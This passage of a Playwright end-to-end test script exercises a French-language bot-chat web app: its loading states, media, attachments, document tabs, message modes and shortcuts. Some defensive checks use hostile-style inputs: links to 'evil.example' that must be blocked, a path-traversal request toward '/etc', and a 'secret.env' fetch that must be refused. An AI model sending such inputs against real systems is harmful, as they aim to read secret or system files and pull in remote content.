  if (!/^\/devtools\/page\/(onglet-leurre|onglet-steam)$/.test(request.url)) return socket.destroy()
  cdpWss.handleUpgrade(request, socket, head, (client) => cdpWss.emit('connection', client, request))
})

let child
let vaultService
let browser
try {
  await new Promise((resolve) => mock.listen(9121, '127.0.0.1', resolve))
  await new Promise((resolve) => cdpMock.listen(9223, '127.0.0.1', resolve))
  for (const args of [['create-keychain', '-p', 'e2e', BROWSER_VAULT_KEYCHAIN], ['unlock-keychain', '-p', 'e2e', BROWSER_VAULT_KEYCHAIN], ['set-keychain-settings', BROWSER_VAULT_KEYCHAIN]]) {
    await execFileAsync('/usr/bin/security', args)
  }
  vaultService = spawn(process.execPath, ['server/browser-vault/standalone.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env, BROWSER_VAULT_PORT: '4333', BROWSER_VAULT_CDP_ORIGIN: 'http://127.0.0.1:9223',
      HERMESBOT_KEYCHAIN: BROWSER_VAULT_KEYCHAIN, HERMESBOT_VAULT_AUDIT: BROWSER_VAULT_AUDIT, HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      HERMES_ORIGIN: 'http://127.0.0.1:9121',
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let vaultLog = ''
  vaultService.stdout.on('data', (data) => { vaultLog += data })
  vaultService.stderr.on('data', (data) => { vaultLog += data })
  for (let attempt = 0; attempt < 50 && !vaultLog.includes('HermesBot vault on'); attempt += 1) await delay(100)
  if (!vaultLog.includes('HermesBot vault on')) throw new Error(`Le coffre ne démarre pas : ${vaultLog}`)
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121', OLLAMA_ORIGIN: 'http://127.0.0.1:9121',
      BROWSER_VAULT_PORT: '4333', HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      BROWSER_TOUR_COMMAND: BROWSER_TOUR_FIXTURE, BROWSER_TOUR_OWNER_FILE,
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
      ...TEST_ENV,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let serverLog = ''
  child.stdout.on('data', (data) => { serverLog += data })
  child.stderr.on('data', (data) => { serverLog += data })
  let ready = false
  for (let attempt = 0; attempt < 50; attempt += 1) {
    try { if ((await fetch('http://127.0.0.1:4332/api/health')).ok) { ready = true; break } } catch { /* server not ready */ }
    await delay(100)
  }
  if (!ready) throw new Error(`Serveur de test indisponible: ${serverLog}`)

  if ((await fetch('http://127.0.0.1:4332/api/health', { headers: { Origin: 'null' } })).status !== 403) throw new Error('Origin null accepté.')

  browser = await chromium.launch({ headless: true, channel: 'chrome' })
  // French interface: the texts searched below come from the French catalog.
  const page = await browser.newPage({ viewport: { width: 1280, height: 800 }, locale: 'fr-FR' })
  const errors = []
  page.on('pageerror', (error) => errors.push(error.message))
  // Chromium announces the request before the CSP blocks it: only a CSP refusal removes it from the list.
  page.on('request', (request) => { if (request.url().includes('evil.example')) remoteRequests.push(request.url()) })
  page.on('requestfailed', (request) => {
    if (request.failure()?.errorText === 'csp') remoteRequests.splice(remoteRequests.indexOf(request.url()), 1)
  })
  await page.goto('http://127.0.0.1:4332/', { waitUntil: 'domcontentloaded' })
  await page.locator('.login-card').waitFor({ timeout: 15_000 })
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  // Slow gateway: waiting screen, never "Aucun bot", then the conversation skeleton.
  const releaseProfiles = holdReplies('profiles.list')
  const releaseResume = holdReplies('session.resume')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('.app-loading').getByText('Chargement de tes bots…').waitFor({ timeout: 15_000 })
  await page.locator('.loading-bar i').waitFor({ timeout: 5_000 })
  if (await page.getByText('Aucun bot à afficher').count()) throw new Error('« Aucun bot » affiché pendant le chargement.')
  await page.screenshot({ path: `${SCREENSHOTS}loading-app.png` })
  releaseProfiles()
  await page.locator('.chat-skeleton span').first().waitFor({ timeout: 15_000 })
  await page.locator('.chat-loading').getByText('Ouverture de la conversation avec Nova…').waitFor({ timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}loading-chat.png` })
  if (await page.getByText('Aucun bot à afficher').count()) throw new Error('« Aucun bot » affiché pendant le chargement.')
  releaseResume()
  await page.locator('.chat-loading').waitFor({ state: 'detached', timeout: 15_000 })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.bot-row').count() !== 3) throw new Error('Le roster doit montrer Nova, Orion et le chat local, sans les profils système.')
  await page.getByText('Je suis ton bot Hermes de test.').waitFor()
  await page.getByRole('textbox', { name: 'Message à Nova' }).fill('Test animation')
  await page.getByRole('textbox', { name: 'Message à Nova' }).press('Enter')
  await page.locator('.details-panel .live-avatar.is-working img.live-avatar-motion').waitFor({ timeout: 5_000 })
  await page.waitForFunction(() => { const image = document.querySelector('.details-panel .live-avatar.is-working img.live-avatar-motion'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 2_500 })
  // Status visible at a glance: banner, roster row, chat header.
  await page.locator('.working-strip.has-work').getByText('1 au travail').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=nova] .live-avatar.is-working img.live-avatar-motion').waitFor({ timeout: 2_000 })
  await page.locator('.chat-identity.is-working .chat-status').getByText('Au travail').waitFor({ timeout: 2_000 })
  await delay(600) // let the entrance animations finish: headless Chrome only advances them on demand
  await page.screenshot({ path: `${SCREENSHOTS}nova-working-ui.png` })
  await page.locator('.details-panel .live-avatar.is-done img.live-avatar-motion').waitFor({ timeout: 6_000 })
  await page.locator('[data-bot=nova] .bot-row-status.is-done').getByText('Terminé').waitFor({ timeout: 2_000 })
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 2_000 })
  await page.screenshot({ path: `${SCREENSHOTS}nova-done-ui.png` })
  // Bot never opened, woken by another bot: only its `session.active_list` reports it as working.
  liveStatusByProfile.orion = 'working'
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 9_000 })
  if (!activeListParams.some((params) => params.profile === 'orion')) throw new Error('session.active_list n’est pas demandé pour le profil du bot.')
  delete liveStatusByProfile.orion
  await page.locator('[data-bot=orion] .bot-row-status.is-done').waitFor({ timeout: 9_000 })
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 9_000 })
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await page.locator('.messages-scroll').getByText('NOREPLY').count()) throw new Error('NOREPLY est visible dans le chat.')
  for (const hidden of ['Background process', 'Délégation terminée', 'demande entre bots', 'OUT-OF-BAND']) {
    if (await page.locator('.messages-scroll').getByText(hidden).count()) throw new Error(`« ${hidden} » est visible dans le chat.`)
  }
  await page.locator('.messages-scroll').getByText('Message glissé pendant le tour').waitFor({ timeout: 5_000 })
  await page.locator('.message-content a[href*="evil.example"]').waitFor({ timeout: 5_000 })
  if (await page.locator('.message-content img[src*="evil.example"]').count()) throw new Error('Image distante chargée.')
  if (await page.locator('.bot-row-preview').getByText('NOREPLY').count()) throw new Error('NOREPLY est visible dans le roster.')

  // MEDIA: media: gallery, video played with Range, fallback, viewer, never raw text or file://.
  await page.locator('.media-group.is-grid img.media-image').nth(1).scrollIntoViewIfNeeded()
  await page.waitForFunction(() => {
    const images = [...document.querySelectorAll('.media-group.is-grid img.media-image')]
    return images.length === 2 && images.every((image) => image.complete && image.naturalWidth > 0)
  }, null, { timeout: 5_000 })
  await page.waitForFunction(() => {
    const video = document.querySelector('video.media-video')
    return Boolean(video && video.readyState >= 1 && video.duration > 1)
  }, null, { timeout: 10_000 })
  if (!mediaRequests.some((item) => item.route === 'stream' && item.path === '/Users/test/videos/video.mp4' && item.range)) throw new Error('La vidéo n’est pas passée par /api/files/stream avec Range.')
  if (!mediaRequests.some((item) => item.route === 'download' && item.path === '/Users/test/visuels/slide 01.jpg' && item.profile === 'orion')) throw new Error('Image non relayée par /api/fs/download pour orion.')
  await page.locator('.media-fallback').getByText('absent.jpg').waitFor({ timeout: 5_000 })
  const rawMediaTag = await page.locator('.message-content p, .message-content .media-group').evaluateAll((nodes) => nodes.some((node) => node.textContent.includes('MEDIA:')))
  if (rawMediaTag) throw new Error('Une balise MEDIA: brute est visible dans le chat.')
  await page.locator('.message-content pre').getByText('MEDIA:/Users/test/exemple-de-syntaxe.png').waitFor()
  if (mediaRequests.some((item) => item.path.includes('exemple-de-syntaxe'))) throw new Error('Un exemple de code a été chargé comme média.')
  if (await page.locator('img[src^="file:"], video[src^="file:"], audio[src^="file:"]').count()) throw new Error('Un média est lu en file://.')
  await page.locator('.media-group.is-grid .media-thumb').first().click()
  await page.locator('.media-viewer img').waitFor({ timeout: 5_000 })
  await page.locator('.media-viewer-count').getByText('1 / 2').waitFor()
  await page.keyboard.press('ArrowRight')
  await page.locator('.media-viewer-count').getByText('2 / 2').waitFor()
  await page.waitForFunction(() => { const image = document.querySelector('.media-viewer img'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 5_000 })
  // Headless Chrome only renders frames on demand: wait for the fade to end before the capture.
  await page.waitForFunction(() => getComputedStyle(document.querySelector('.media-viewer')).opacity === '1', null, { timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}media-viewer.png` })
  await page.keyboard.press('Escape')
  await page.locator('.media-viewer').waitFor({ state: 'detached', timeout: 5_000 })
  await page.locator('.media-group.is-grid').scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}media-chat.png` })
  // Files quoted by path, without MEDIA:: readable under the message, never those inside a code block.
  const cited = page.locator('.message-assistant .cited-files')
  await cited.locator('.cited-files-label').getByText('3 fichiers cités').waitFor({ timeout: 5_000 })
  await page.waitForFunction(() => {
    const video = document.querySelector('.cited-files video.media-video')
    return Boolean(video && video.readyState >= 1 && video.duration > 1)
  }, null, { timeout: 10_000 })
  await page.waitForFunction(() => { const image = document.querySelector('.cited-files img.media-image'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 5_000 })
  await cited.locator('.media-fallback').getByText('absente.png').waitFor({ timeout: 5_000 })
  if (mediaRequests.some((item) => item.path.includes('exemple-cite'))) throw new Error('Un chemin d’un bloc de code a été chargé.')
  // A command in a code block: one click copies it, without the final line break.
  await page.context().grantPermissions(['clipboard-read', 'clipboard-write'], { origin: 'http://127.0.0.1:4332' })
  const codeBlock = page.locator('.message-assistant .code-block').filter({ hasText: 'exemple-cite.mp4' })
  await codeBlock.hover()
  await codeBlock.getByRole('button', { name: 'Copier', exact: true }).click()
  await codeBlock.getByRole('button', { name: 'Copié', exact: true }).waitFor({ timeout: 3_000 })
  const copiedCode = await page.evaluate(() => navigator.clipboard.readText())
  if (copiedCode !== 'ls /Users/test/videos/exemple-cite.mp4') throw new Error(`Bloc de code mal copié : ${JSON.stringify(copiedCode)}`)
  await codeBlock.screenshot({ path: `${SCREENSHOTS}code-copy.png` })
  await cited.locator('.media-thumb').first().click()
  await page.locator('.media-viewer img').waitFor({ timeout: 5_000 })
  await page.keyboard.press('Escape')
  await page.locator('.media-viewer').waitFor({ state: 'detached', timeout: 5_000 })
  await page.locator('.messages-scroll').hover()
  await page.mouse.wheel(0, -200)
  await cited.evaluate((element) => element.scrollIntoView({ block: 'center' }))
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}cited-files.png` })
  // Mentions: @ opens the list, Enter picks, the note goes to the bot, the user only sees their own text.
  const orionBox = page.getByRole('textbox', { name: 'Message à Orion' })
  await page.locator('.message-user').getByText('Regarde avec').waitFor({ timeout: 5_000 })
  await page.locator('.message-user').getByText('[Fichier : ancien.pdf]').waitFor({ timeout: 2_000 })
  if (await page.locator('.messages-scroll').getByText('Bot Mode roster').count()) throw new Error('La note de mentions est visible après rechargement.')
  await orionBox.fill('Vois avec @no')
  await page.locator('.mention-menu').getByText('Nova', { exact: true }).waitFor({ timeout: 3_000 })
  if (await page.locator('.mention-menu').getByText('Orion', { exact: true }).count()) throw new Error('Le bot de la conversation est proposé.')
  await orionBox.press('Enter')
  await page.locator('.mention-menu').waitFor({ state: 'detached', timeout: 2_000 })
  if (await orionBox.inputValue() !== 'Vois avec @nova ') throw new Error('Mention mal insérée.')
  if (await page.locator('.message-user').getByText('Vois avec').count()) throw new Error('Entrée a envoyé au lieu de choisir le bot.')
  await orionBox.press('Enter')
  await page.locator('.message-user .mention-chip').getByText('@nova').last().waitFor({ timeout: 5_000 })
  await page.getByRole('button', { name: 'Envoyer' }).waitFor({ timeout: 5_000 })
  if (!lastPromptText.includes('@nova = agent profile "nova"') || !lastPromptText.includes('message_agent')) throw new Error('La note de mentions n’est pas partie.')
  if (await page.locator('.messages-scroll').getByText('Bot Mode roster').count()) throw new Error('La note de mentions est visible.')

  // Drag and drop: visible zone, images and files attached, empty file refused.
  await page.evaluate(() => {
    const transfer = new DataTransfer()
    for (const [name, type, body] of [['film.mp4', 'video/mp4', 'video'], ['dossier.pdf', 'application/pdf', 'pdf'], ['vignette.png', 'image/png', 'png'], ['vide.txt', 'text/plain', '']]) transfer.items.add(new File([body], name, { type }))
    window.__drop = transfer
    document.querySelector('.chat-panel').dispatchEvent(new DragEvent('dragenter', { bubbles: true, cancelable: true, dataTransfer: transfer }))
  })
  await page.locator('.drop-overlay').getByText('Dépose pour joindre à Orion').waitFor({ timeout: 2_000 })
  await page.screenshot({ path: `${SCREENSHOTS}drop-overlay.png` })
  await page.evaluate(() => document.querySelector('.chat-panel').dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: window.__drop })))
  await page.locator('.drop-overlay').waitFor({ state: 'detached', timeout: 2_000 })
  await page.locator('.composer-file').getByText('film.mp4').waitFor({ timeout: 2_000 })
  await page.locator('.composer-file').getByText('dossier.pdf').waitFor({ timeout: 2_000 })
  await page.locator('.composer-image img[alt="vignette.png"]').waitFor({ timeout: 2_000 })
  await page.locator('.toast').getByText('vide.txt est vide').waitFor({ timeout: 2_000 })
  await page.locator('.toast button').click()
  // The draft and its files stay on their bot.
  await orionBox.fill('Regarde ça')
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  if (await page.locator('.composer-file').count()) throw new Error('Les fichiers ont suivi sur un autre bot.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  await page.locator('.composer-file').getByText('film.mp4').waitFor({ timeout: 2_000 })
  if (await orionBox.inputValue() !== 'Regarde ça') throw new Error('Brouillon perdu au changement de bot.')
  await orionBox.press('Enter')
  await page.locator('.message-user').getByText('[Fichier : film.mp4]').last().waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 40 && !lastPromptText.includes('@file:attachments/dossier.pdf'); attempt += 1) await delay(50)
  if (fileAttachCalls.length !== 2 || imageAttachCalls.length !== 1) throw new Error(`Pièces jointes : ${fileAttachCalls.length} fichiers, ${imageAttachCalls.length} images.`)
  if (!fileAttachCalls[0].data_url?.startsWith('data:video/mp4;base64,') || fileAttachCalls[0].session_id !== 'chat-orion') throw new Error('file.attach mal formé.')
  if (!lastPromptText.includes('@file:attachments/film.mp4')) throw new Error('La référence du fichier n’est pas dans le prompt.')
  if (await page.locator('.messages-scroll').getByText('@file:').count()) throw new Error('Un @file: brut est visible.')
  await page.getByRole('button', { name: 'Envoyer' }).waitFor({ timeout: 5_000 })

  // Documents: tabs next to the chat. Isolated HTML, rendered Markdown, nothing remote loads.
  await page.locator('.media-document').getByText('rapport.pdf').scrollIntoViewIfNeeded()
  await page.locator('.media-document').getByText('rapport.pdf').click()
  await page.locator('.rail-tab.is-active').getByText('rapport.pdf').waitFor({ timeout: 3_000 })
  await page.locator('.details-panel.has-document iframe[src*="rapport.pdf"]').waitFor({ timeout: 5_000 })
  await page.locator('.media-document').getByText('page.html').click()
  await page.locator('.rail-tab.is-active').getByText('page.html').waitFor({ timeout: 3_000 })
  const htmlFrame = page.frameLocator('iframe[sandbox="allow-scripts"]')
  await htmlFrame.getByText('Script local OK').waitFor({ timeout: 5_000 })
  await htmlFrame.locator('body[data-net]').waitFor({ timeout: 5_000 })
  if (await htmlFrame.locator('body').getAttribute('data-cookie') !== 'bloque') throw new Error('La page HTML lit les cookies de l’app.')
  if (await htmlFrame.locator('body').getAttribute('data-net') !== 'bloque') throw new Error('La page HTML a accès au réseau.')
  await page.locator('.media-document').getByText('note.md').click()
  await page.locator('.document-markdown h1').getByText('Note du bot').waitFor({ timeout: 5_000 })
  await page.locator('.document-markdown a[href*="evil.example"]').waitFor({ timeout: 2_000 })
  if (await page.locator('.rail-tab').count() !== 4) throw new Error('Il faut Le bot et trois documents en onglets.')
  await delay(350)
  await page.screenshot({ path: `${SCREENSHOTS}document-tabs.png` })
  await page.getByRole('button', { name: 'Fermer note.md' }).click()
  await page.locator('.rail-tab.is-active').getByText('page.html').waitFor({ timeout: 2_000 })
  await page.getByRole('button', { name: 'Fermer page.html' }).click()
  await page.getByRole('button', { name: 'Fermer rapport.pdf' }).click()
  await page.locator('.details-panel.has-document').waitFor({ state: 'detached', timeout: 2_000 })
  if (remoteRequests.length) throw new Error(`Chargement distant : ${remoteRequests[0]}`)

  // /api/document: session required, three formats only, HTML with no origin or network.
  const documentRoute = (file, profile = 'orion') => `http://127.0.0.1:4332/api/document?${new URLSearchParams({ profile, path: file })}`
  if ((await fetch(documentRoute('/Users/test/docs/note.md'))).status !== 401) throw new Error('/api/document sans session.')
  const documentHeaders = await page.evaluate(async (routes) => Promise.all(routes.map(async (route) => {
    const response = await fetch(route, { credentials: 'same-origin' })
    return { status: response.status, type: response.headers.get('content-type'), csp: response.headers.get('content-security-policy'), disposition: response.headers.get('content-disposition') }
  })), ['/Users/test/docs/page.html', '/Users/test/docs/rapport.pdf', '/Users/test/secret.env', '/Users/test/../etc/a.md'].map((file) => documentRoute(file).replace('http://127.0.0.1:4332', '')))
  if (documentHeaders[0].status !== 200 || !documentHeaders[0].csp.startsWith('sandbox allow-scripts;') || documentHeaders[0].csp.includes('allow-same-origin') || !documentHeaders[0].csp.includes("default-src 'none'")) throw new Error(`CSP HTML : ${JSON.stringify(documentHeaders[0])}`)
  if (documentHeaders[0].disposition !== 'inline') throw new Error('Une page HTML doit s’afficher en ligne.')
  if (documentHeaders[1].type !== 'application/pdf' || documentHeaders[1].csp.includes('sandbox')) throw new Error(`PDF : ${JSON.stringify(documentHeaders[1])}`)
  if (documentHeaders[2].status !== 415 || documentHeaders[3].status !== 400) throw new Error(`Filtres /api/document : ${JSON.stringify(documentHeaders.slice(2))}`)

  // Usage tab: session.stats counters, context breakdown, bot history.
  await page.getByRole('tab', { name: 'Usage' }).click()
  await page.locator('.usage-context').getByText('4 %').waitFor({ timeout: 5_000 })
  await page.locator('.usage-stat').filter({ hasText: 'Cache lu' }).first().getByText('90k').waitFor({ timeout: 2_000 })
  await page.locator('.usage-stat').filter({ hasText: 'Appels API' }).first().getByText('14').waitFor({ timeout: 2_000 })
  await page.locator('.usage-row').getByText('Conversation').waitFor({ timeout: 2_000 })
  await page.locator('.usage-bars i').first().waitFor({ timeout: 2_000 })
  await page.locator('.usage-row').getByText('Opus 5.5').waitFor({ timeout: 2_000 })
  if (!analyticsProfiles.includes('orion')) throw new Error('L’historique n’a pas demandé le profil du bot.')
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}usage-tab.png` })
  await page.getByRole('tab', { name: 'Routines' }).click()

  // Modes: BRAIN and PLAN add an instruction for this turn only, EXEC adds nothing.
  const modeRadio = (name) => page.getByRole('radio', { name, exact: true })
  const sendInMode = async (text) => {
    await orionBox.fill(text)
    await orionBox.press('Enter')
    for (let attempt = 0; attempt < 60 && lastPromptText !== text; attempt += 1) await delay(25)
    if (lastPromptText !== text) throw new Error(`Le texte stocké doit rester celui de l’utilisateur : ${lastPromptText}`)
    await page.locator('.composer-send[aria-label="Envoyer"]').waitFor({ state: 'attached', timeout: 3_000 })
  }
  if (await modeRadio('EXEC').getAttribute('aria-checked') !== 'true') throw new Error('EXEC doit être le mode par défaut.')
  await modeRadio('BRAIN').click()
  if (await orionBox.getAttribute('placeholder') !== 'Réfléchir avec Orion') throw new Error('Champ de saisie non adapté au mode.')
  await sendInMode('Test mode brain')
  if (!lastApiText?.startsWith('Test mode brain\n\n[HermesBot mode: BRAIN.') || !lastApiText.includes('Do not change files')) throw new Error(`api_text BRAIN : ${lastApiText}`)
  if (await page.locator('.messages-scroll').getByText('HermesBot mode').count()) throw new Error('La consigne du mode est visible.')
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  if (await modeRadio('EXEC').getAttribute('aria-checked') !== 'true') throw new Error('Le mode doit rester propre à chaque bot.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await modeRadio('BRAIN').getAttribute('aria-checked') !== 'true') throw new Error('Mode perdu au retour sur le bot.')
  await modeRadio('PLAN').click()
  await sendInMode('Test mode plan')
  if (!lastApiText?.includes('[HermesBot mode: PLAN.')) throw new Error(`api_text PLAN : ${lastApiText}`)
  await modeRadio('EXEC').click()
  await sendInMode('Test mode exec')
  if (lastApiText !== undefined) throw new Error(`EXEC ne doit rien ajouter : ${lastApiText}`)
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}modes.png` })

  // While working: Attendre (default) keeps the draft, File sends it after the turn, Prio interrupts the bot.
  await orionBox.fill('Test pilotage')
  await orionBox.press('Enter')
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ timeout: 3_000 })
  const delivery = (name) => page.getByRole('radiogroup', { name: 'Envoi pendant le travail' }).getByRole('radio', { name, exact: true })
  if (await delivery('Attendre').getAttribute('aria-checked') !== 'true') throw new Error('Attendre doit être le mode par défaut pendant le travail.')
  await orionBox.fill('Fais plutôt la version courte')
  await orionBox.press('Enter')
  await delay(250)
  if (await orionBox.inputValue() !== 'Fais plutôt la version courte') throw new Error('Attendre doit garder le brouillon dans le champ.')
  if (queuedPrompts.length || steerCalls.length || await page.locator('.message-user').getByText('Fais plutôt la version courte').count()) throw new Error('Attendre ne doit rien envoyer.')
  if (await page.getByRole('button', { name: 'Mettre en file' }).count()) throw new Error('Pas de bouton d’envoi en mode Attendre.')
  // The draft survives switching chats and closing the app (local storage).
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  if (await page.getByRole('textbox', { name: 'Message à Nova' }).inputValue()) throw new Error('Le brouillon de Orion est passé chez Nova.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await orionBox.inputValue() !== 'Fais plutôt la version courte') throw new Error('Brouillon perdu au retour sur le bot.')
  if (!(await page.evaluate(() => localStorage.getItem('hermesbot-drafts') || '')).includes('Fais plutôt la version courte')) throw new Error('Le brouillon n’est pas gardé pour la prochaine ouverture.')
  // File: goes out with `queued`, no instruction, and stays visible as "En file".
  await delivery('File').click()
  await orionBox.press('Enter')
  for (let attempt = 0; attempt < 40 && !queuedPrompts.length; attempt += 1) await delay(25)
  if (queuedPrompts[0]?.text !== 'Fais plutôt la version courte' || queuedPrompts[0].apiText !== undefined) throw new Error(`File : ${JSON.stringify(queuedPrompts)}`)
  await page.locator('.message-user').filter({ hasText: 'Fais plutôt la version courte' }).locator('.message-delivery').getByText('En file').waitFor({ timeout: 2_000 })
  if (await orionBox.inputValue()) throw new Error('Le message envoyé reste dans le champ.')
  if (await delivery('Attendre').getAttribute('aria-checked') !== 'true') throw new Error('Après un envoi, retour à Attendre.')
  if ((await page.evaluate(() => localStorage.getItem('hermesbot-drafts') || '')).includes('Fais plutôt la version courte')) throw new Error('Le brouillon envoyé reste stocké.')
  if (interruptCalls.length) throw new Error('File ne doit pas interrompre le bot.')
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ timeout: 1_000 })
  // Prio: same queue with a resume instruction, then interrupts the current turn.
  await delivery('Prio').click()
  await orionBox.fill('Et ajoute le tableau')
  await delay(250)
  await page.screenshot({ path: `${SCREENSHOTS}delivery.png` })
  await page.getByRole('button', { name: 'Envoyer en priorité' }).click()
  for (let attempt = 0; attempt < 40 && !interruptCalls.length; attempt += 1) await delay(25)
  if (queuedPrompts[1]?.text !== 'Et ajoute le tableau' || !queuedPrompts[1].apiText?.startsWith('Et ajoute le tableau\n\n[HermesBot priority:')) throw new Error(`Prio : ${JSON.stringify(queuedPrompts[1])}`)
  if (interruptCalls[0]?.session_id !== 'chat-orion' || interruptCalls[0].execution_generation !== 1) throw new Error(`Interruption : ${JSON.stringify(interruptCalls)}`)
  await page.locator('.message-user').filter({ hasText: 'Et ajoute le tableau' }).locator('.message-delivery').getByText('Prioritaire').waitFor({ timeout: 2_000 })
  await page.locator('.message-assistant').getByText('Pilotage terminé.').waitFor({ timeout: 4_000 })
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ state: 'detached', timeout: 3_000 })

  // Bot question mid-turn (clarify tool): card above the field, "Attend ta réponse" everywhere.
  liveStatusByProfile.orion = 'waiting'
  await orionBox.fill('Test question')
  await orionBox.press('Enter')
  const promptCard = page.locator('.prompt-card')
  await promptCard.getByText('Pour quel post ?').waitFor({ timeout: 3_000 })
  await page.locator('.chat-status').getByText('Attend ta réponse').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=orion] .bot-row-status').getByText('Attend ta réponse').waitFor({ timeout: 8_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}question.png` })
  await promptCard.getByRole('button', { name: 'Post B', exact: true }).click()
  await promptCard.getByText('Que doit montrer l’image ?').waitFor({ timeout: 3_000 })
  await promptCard.getByRole('button', { name: 'Personnage', exact: true }).click()
  await promptCard.getByRole('button', { name: 'Décor', exact: true }).click()
  await promptCard.getByRole('button', { name: 'Valider (2)' }).click()
  await promptCard.getByText('Une remarque ?').waitFor({ timeout: 3_000 })
  await promptCard.getByRole('textbox').fill('Fond clair')
  await promptCard.getByRole('textbox').press('Enter')
  await page.locator('.message-assistant').getByText('Images prêtes.').waitFor({ timeout: 4_000 })
  await promptCard.waitFor({ state: 'detached', timeout: 2_000 })
  delete liveStatusByProfile.orion
  const sentAnswers = promptAnswers.map(({ method, profile, session_id, execution_generation, prompt_id, answer }) => [method, profile, session_id, execution_generation, prompt_id, answer].join('|'))
  if (JSON.stringify(sentAnswers) !== JSON.stringify([
    'clarify.respond|orion|chat-orion|1|q1|Post B',
    'clarify.respond|orion|chat-orion|1|q2|["Personnage","Décor"]',
    'clarify.respond|orion|chat-orion|1|q3|Fond clair',
  ])) throw new Error(`Réponses aux questions : ${JSON.stringify(sentAnswers)}`)
  // A question left open comes back when the session resumes.
  resumePrompts['chat-nova'] = [{ kind: 'clarify', prompt_id: 'q-reprise', execution_generation: 1, question: 'On continue ?', choices: ['Oui', 'Non'], multi_select: false }]
  await page.locator('[data-bot=nova]').click()
  await promptCard.getByText('On continue ?').waitFor({ timeout: 5_000 })
  delete resumePrompts['chat-nova']
  await promptCard.getByRole('button', { name: 'Oui', exact: true }).click()
  await page.locator('.message-assistant').getByText('Reprise terminée.').waitFor({ timeout: 4_000 })
  await promptCard.waitFor({ state: 'detached', timeout: 2_000 })
  if (promptAnswers.at(-1)?.prompt_id !== 'q-reprise' || promptAnswers.at(-1)?.answer !== 'Oui') throw new Error('Réponse à la question reprise incorrecte.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })

  // Shortcuts: palette ⌘K, next bot Alt+↓, quote ⌘L, search ⌘F.
  await page.keyboard.press('Meta+k')
  await page.getByRole('textbox', { name: 'Chercher un bot' }).fill('nov')
  await page.locator('.palette-results').getByText('Nova', { exact: true }).waitFor({ timeout: 2_000 })
  await page.keyboard.press('Enter')
  await page.locator('[data-bot=nova].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.palette').waitFor({ state: 'detached', timeout: 2_000 })
  await page.keyboard.press('Alt+ArrowDown')
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.message-assistant').getByText('Pilotage terminé.').evaluate((node) => { const range = document.createRange(); range.selectNodeContents(node); const selection = window.getSelection(); selection.removeAllRanges(); selection.addRange(range) })
  await page.keyboard.press('Meta+l')
  if (await orionBox.inputValue() !== '> Pilotage terminé.\n\n') throw new Error(`Citation ⌘L : ${await orionBox.inputValue()}`)
  await orionBox.fill('')
  await page.keyboard.press('Meta+f')
  await page.getByRole('textbox', { name: 'Texte à rechercher' }).waitFor({ timeout: 2_000 })
  await page.getByRole('button', { name: 'Fermer la recherche' }).click()

  // Media tab: what the bot sent, documents included, excluding code examples.
  await page.getByRole('tab', { name: 'Médias' }).click()
  await page.locator('.media-library .media-document').getByText('note.md').waitFor({ timeout: 3_000 })
  await page.locator('.media-library img.media-image').first().waitFor({ timeout: 3_000 })
  if (await page.locator('.media-library').getByText('exemple-de-syntaxe').count()) throw new Error('Un exemple de code est listé dans les médias.')
  await page.locator('.media-library .media-document').getByText('rapport.pdf').click()
  await page.locator('.rail-tab.is-active').getByText('rapport.pdf').waitFor({ timeout: 3_000 })
  await page.getByRole('button', { name: 'Fermer rapport.pdf' }).click()
  await page.getByRole('tab', { name: 'Routines' }).click()

  // Dark theme: same glass, control capture, then back to light.
  await page.getByRole('button', { name: 'Passer au thème sombre' }).click()
